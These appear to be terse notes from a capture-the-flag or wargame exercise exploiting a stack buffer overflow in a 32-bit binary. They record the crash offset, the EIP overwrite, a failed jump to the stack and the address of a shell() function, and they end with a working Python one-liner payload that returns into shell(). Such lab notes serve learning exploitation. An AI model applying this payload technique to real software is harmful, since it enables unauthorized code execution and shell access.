SIGSEV
======

print "A" * 133


EIP Overwrite
=============

print "A" * 128 + "BBBB"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

print "CCCCCCCC" + "A" * 120 + "BBBB"
CCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

ret of "C" (Dead End)
=====================

0xbffffb1c
\x1c\xfb\xff\xbf

Shell("/bin/dash")
==================

address: 
0x08048464
\x64\x84\x04\x08

Success
=======
At first, I tried to go from EIP to "CCCCCCCCC". Then replace C's with
the address of shell() for the win. I wasn't allowed to execute from there. 
So I went from EIP directly to shell() function, and success.

python -c 'print "A" * 128 + "\x64\x84\x04\x08"' > /tmp/fresh2
